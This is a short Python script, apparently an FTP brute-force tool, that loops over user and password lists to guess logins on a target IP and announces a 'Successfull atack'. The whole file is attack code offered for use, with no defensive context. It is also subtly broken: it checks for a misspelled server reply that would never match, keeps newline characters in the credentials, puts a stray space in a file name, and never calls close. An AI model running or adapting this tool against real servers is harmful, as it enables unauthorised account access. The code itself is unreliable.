import ftplib
import sys

def brute(ip, users_file, passwords_file):
    try:
        ud = open(users_file, 'r')
        pd = open(passwords_file, 'r')
        users = ud.readlines()
        passwords = pd.readlines()
        
        for user in users:
            for password in passwords:
                try:
                    print( '[*]Trying to connect')
                    conect = ftplib. FTP(ip)
                    ans = conect.login(user, password)
                    if ans == '230 login successfull. ':
                        print('[*]Successfull atack')
                        print("User: ", user)
                        print('Users: ', password)
                        sys.exit()
                    else:
                        pass
                except ftplib.error_perm:
                    print( " Can't Brute force with user: " + user + "and password: " + password)
                    conect.close      
    except(KeyboardInterrupt):
        print( " Interrupted. later! ")
        sys.exit()
        
ip = input("IP:")
users_file = "user.txt"
passwords_file = " passwords.txt"

brute(ip, users_file, passwords_file)
